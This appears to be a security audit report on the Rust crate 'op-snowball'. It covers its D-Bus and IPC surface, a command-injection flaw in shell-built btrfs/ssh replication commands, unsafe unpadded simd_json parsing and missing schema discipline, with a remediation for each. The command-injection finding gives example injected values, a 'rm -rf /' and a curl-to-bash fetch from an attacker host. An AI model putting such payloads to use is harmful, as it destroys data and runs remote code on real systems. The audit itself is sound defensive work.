# D-BUS & IPC ATTACK SURFACE AUDIT

### 1. Registered D-Bus Interfaces, Methods, and Signals
No D-Bus interfaces, methods, or signals are registered or defined in the provided source files for the `op-snowball` crate. Although the workspace `Cargo.toml` contains dependencies for `zbus` (D-Bus library), the specific implementation files in this crate do not contain any `#[dbus_interface]` attributes or D-Bus registration logic.

### 2. Caller Identity & Authorization Checks
*   **D-Bus Methods**: Not applicable (none implemented).
*   **Internal Process Spawning**: The methods `stream_to_remote` (`crates/op-snowball/src/snowball.rs:211`), `stream_vectors` (`crates/op-snowball/src/streaming_snowball.rs:373`), and `stream_to_replicas` (`crates/op-snowball/src/streaming_snowball.rs:406`) spawn external processes (`sh`, `bash`, `btrfs`, `ssh`) and mutate replication states without performing any authentication or authorization checks of the initiating context.

### 3. Session Bus vs. System Bus Connection
Not applicable. No D-Bus bus connection logic is defined within the audited files of the `op-snowball` crate.

### 4. Deserialization of Caller-Supplied Bytes Without Validation
The following methods read files directly from the filesystem (including local cache paths and state paths) and deserialize them without any schema validation or cryptographic integrity verification:
*   `get_cached_block` (`crates/op-snowball/src/btrfs_numa_integration.rs:125`)
*   `read_state` (`crates/op-snowball/src/snowball.rs:191`)
*   `read_current_state` (`crates/op-snowball/src/streaming_snowball.rs:171`)

---

# CRITICAL SECURITY FINDINGS

### Finding 1: Arbitrary Command Injection via Shell Execution in State and Vector Replication
*   **Severity**: Critical
*   **Files / Line Citations**:
    *   `crates/op-snowball/src/snowball.rs:222-229`
    *   `crates/op-snowball/src/streaming_snowball.rs:388-393`
    *   `crates/op-snowball/src/streaming_snowball.rs:420-424`
*   **Description**:
    The system utilizes `sh -c` and `bash -c` to execute pipeline commands involving `btrfs send` and `ssh` for replication. Parameters such as `remote_path`, `remote`, and `replicas` are interpolated directly into the command string without sanitization or shell escaping.
    
    *Example from `crates/op-snowball/src/snowball.rs:222-229`*:
    ```rust
    let output = Command::new("sh")
        .arg("-c")
        .arg(format!(
            "btrfs send {} | ssh {} 'btrfs receive {}'",
            snapshot_path.display(),
            remote_path,
            remote_path
        ))
        .output()
        .await?;
    ```
    If an attacker can manipulate or supply the `remote_path`, `remote`, or `replicas` strings (for instance, via system configuration or IPC messages that invoke these replication endpoints), they can inject shell metacharacters (e.g., `; rm -rf /;` or `& curl http://attacker.com | bash`) to execute arbitrary commands under the privileges of the control plane process.
*   **Remediation**:
    Avoid using a shell interpreter (`sh -c` or `bash -c`). Instead, execute the underlying processes (`btrfs` and `ssh`) directly as separate commands via `tokio::process::Command`, establishing standard input/output pipes via `Stdio::piped()`. If a shell must be used, use a dedicated library like `shell-escape` or `shell-words` to escape all interpolated parameters.

---

### Finding 2: Out-of-Bounds Memory Corruption via Unpadded `simd_json::from_str`
*   **Severity**: Critical
*   **Files / Line Citations**:
    *   `crates/op-snowball/src/btrfs_numa_integration.rs:144`
    *   `crates/op-snowball/src/snowball.rs:194`
    *   `crates/op-snowball/src/streaming_snowball.rs:174`
*   **Description**:
    The application reads JSON data from the filesystem into standard Rust `String` instances and immediately parses them using `unsafe { simd_json::from_str(...) }`.
    
    *Example from `crates/op-snowball/src/btrfs_numa_integration.rs:143-144`*:
    ```rust
    let mut data = tokio::fs::read_to_string(&block_file).await?;
    let block_data: simd_json::OwnedValue = unsafe { simd_json::from_str(&mut data)? };
    ```
    `simd-json` utilizes highly optimized SIMD instructions (AVX2/SSE) which require that input string buffers have padding of at least `simd_json::SIMDJSON_PADDING` bytes (typically 64 bytes) at the end. Calling `simd_json::from_str` on a standard `String` populated by `tokio::fs::read_to_string` provides no padding. This causes SIMD vector operations to read past the allocated bounds of the buffer, leading to undefined behavior, memory leakage, or segmentation faults. Additionally, `simd_json::from_str` mutates the buffer in-place during unescaping.
*   **Remediation**:
    Ensure the buffer is padded before parsing. Avoid raw `unsafe` blocks with standard strings; instead, allocate a `Vec<u8>` with `simd_json::SIMDJSON_PADDING` bytes of extra padding, read the file bytes into it, and parse using the safe wrapper `simd_json::to_owned_value` or `simd_json::from_slice`.

---

# SCHEMA-AS-CODE DISCIPLINE AUDIT

The system fails to maintain the schema-as-code discipline. The data contracts for block events, footprints, and persistent system states are expressed as ad-hoc Rust structs and dynamically parsed JSON rather than versioned Protocol Buffer schemas or OSCAL compliance profiles.

### 1. Ad-Hoc Dynamic JSON in Block Events and Footprints
*   **Files / Line Citations**:
    *   `crates/op-snowball/src/footprint.rs:11-18` (`BlockEvent` definition)
    *   `crates/op-snowball/src/footprint.rs:46-54` (`PluginFootprint` definition)
    *   `crates/op-snowball/src/plugin_footprint.rs:11-19` (`PluginFootprint` legacy definition)
    *   `crates/op-snowball/src/streaming_snowball.rs:20-27` (`BlockEvent` duplicate definition)
*   **Violations**:
    The structs use unstructured, ad-hoc JSON variables of type `simd_json::OwnedValue` to store operational payloads, and `HashMap<String, simd_json::OwnedValue>` to store metadata. This makes change tracking and historical rollbacks fragile, as there are no explicit, compiled schema contracts defining what these payloads must contain.

### 2. Unstructured System State Persistence
*   **Files / Line Citations**:
    *   `crates/op-snowball/src/snowball.rs:185-189` (`write_state` payload contract)
    *   `crates/op-snowball/src/streaming_snowball.rs:145-151` (`update_current_state` payload contract)
*   **Violations**:
    The system state (which is authoritative for disaster recovery and reinstallations) is serialized and deserialized using unvalidated JSON blobs (`simd_json::OwnedValue`) and written to raw JSON files (e.g., `current.json`). This violates the core design requirement of using strongly-typed, versioned, and backwards-compatible Protocol Buffer schemas for state persistence.

### Remediation
1.  Define the `BlockEvent`, `PluginFootprint`, and `SystemState` structures as formal Protocol Buffer definitions (`.proto` files).
2.  Incorporate code generation into the build pipeline using `prost-build` (already present in the workspace dependencies).
3.  Replace all uses of `simd_json::OwnedValue` and `HashMap<String, simd_json::OwnedValue>` within these types with the strongly-typed, versioned Rust structs generated from the schemas.